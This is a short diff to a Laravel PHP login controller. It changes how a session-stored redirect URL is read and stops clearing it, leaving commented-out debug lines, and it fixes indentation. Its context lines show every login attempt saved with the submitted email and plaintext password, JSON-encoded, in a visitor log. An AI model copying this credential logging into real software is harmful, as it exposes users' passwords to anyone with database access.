@@ -45,9 +45,10 @@ class LoginController extends Controller
             return '/phpadmin';
         }
         else if(Session::has('url')){
-            $url = Session('url');
-            Session()->forget('url');
-            return $url;
+            $url1 = Session::get('url');
+            //Session()->forget('url');
+            //echo $url1; exit;
+            return $url1;
         }
         return '/';
     }
@@ -69,7 +70,7 @@ class LoginController extends Controller
        $visitor->credentials = json_encode($request->only('email', 'password'));
        $visitor->response = 'invalid';
        $visitor->save();
-        $credentials = $request->only('email', 'password');
+       $credentials = $request->only('email', 'password');
 
         if (\Auth::attempt($credentials)) {
             $visitor->response = 'valid';
